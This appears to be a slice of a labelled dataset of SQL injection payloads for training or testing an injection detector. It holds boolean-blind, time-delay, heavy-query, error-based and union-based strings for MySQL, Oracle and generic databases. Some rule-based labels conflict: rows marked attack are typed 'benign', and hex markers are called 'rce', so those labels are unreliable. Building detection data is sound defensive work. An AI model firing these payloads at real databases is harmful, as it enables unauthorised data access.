row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3510,1'+ ( select tart where 9861 = 9861,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3511,-9555' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 'rwpq' like 'rwpq,1,,boolean_blind,generic,0.95,") or (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
3512,"1"" ) as pydh where 3407 = 3407 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
3513,"1"" where 1831 = 1831 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3514,1 ) ) as goar where 2405 = 2405 and 5927 = 9731--,1,,boolean_blind,generic,0.95,2405 = 2405 and detected — boolean_blind injection (priority 8) on generic,rule-based
3515,"1'+ ( select ounb where 4653 = 4653 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) +'",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
3516,"-9772' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'igaa' = 'igaa",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
3517,"-2116%' ) ) ) union all select 7119,7119,7119,7119,7119--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3518,1 ) where 7729 = 7729,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3519,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( 8126 = 8126",1,,rce,generic,0.95,0x4c4d6142 detected — rce injection (priority 1) on generic,rule-based
